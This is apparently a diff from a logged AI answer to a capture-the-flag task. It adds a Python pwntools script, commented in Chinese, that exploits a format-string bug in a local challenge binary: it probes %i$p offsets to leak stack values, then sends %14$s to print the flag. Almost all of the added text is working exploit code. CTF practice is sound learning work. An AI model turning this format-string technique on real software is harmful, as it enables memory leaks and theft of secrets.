@@ -166,3 +166,63 @@ AIMessage(content='To solve this challenge using pwntools, we\'ll exploit the fo
  '\n'
  'Remember to adjust the `flag_offset` based on your findings from the '
  '`find_offset` function, as stack layouts can differ between environments.')
+
+
+from pwn import *
+
+def main():
+    # 启动本地进程或连接远程服务
+    # 用于本地测试：
+    p = process('./vulnerable_binary')
+
+    # 用于远程连接（如果适用）：
+    # p = remote('challenge.server.com', 1337)
+
+    # 可选：取消以下行的注释以查看所有通信
+    # context.log_level = 'debug'
+
+    # 函数用于查找正确的偏移量
+    def find_offset():
+        for i in range(1, 50):
+            # 每次尝试偏移量时重启进程
+            p = process('./vulnerable_binary')
+            p.recvuntil("what's the flag\n")
+            payload = f'%{i}$p'
+            p.sendline(payload)
+            response = p.recv()
+            p.close()
+
+            # 提取打印的值
+            if b'You answered:' in response:
+                leak = response.split(b'You answered:\n')[1].split(b'\nBut that was totally wrong')[0].strip()
+                print(f'Offset {i}: {leak}')
+                # 检查泄漏是否包含部分标志（例如，可识别的模式）
+                if b'0x' not in leak:
+                    continue
+                # 根据需要添加额外的检查以识别标志
+                # 例如，如果你知道标志的格式，可以在泄漏中查找它
+
+    # 取消以下行的注释以查找偏移量（只需执行一次）
+    # find_offset()
+
+    # 假设我们已经确定标志位于偏移量14
+    flag_offset = 14
+
+    # 利用漏洞读取标志
+    p = process('./vulnerable_binary')
+    p.recvuntil("what's the flag\n")
+
+    # 构造有效载荷以读取标志
+    payload = f'%{flag_offset}$s'
+    p.sendline(payload)
+
+    # 接收响应
+    response = p.recvall()
+
+    # 从响应中提取标志
+    if b'You answered:' in response:
+        flag = response.split(b'You answered:\n')[1].split(b'\nBut that was totally wrong')[0].strip()
+        print(f'Flag: {flag.decode()}')
+
+if __name__ == '__main__':
+    main()
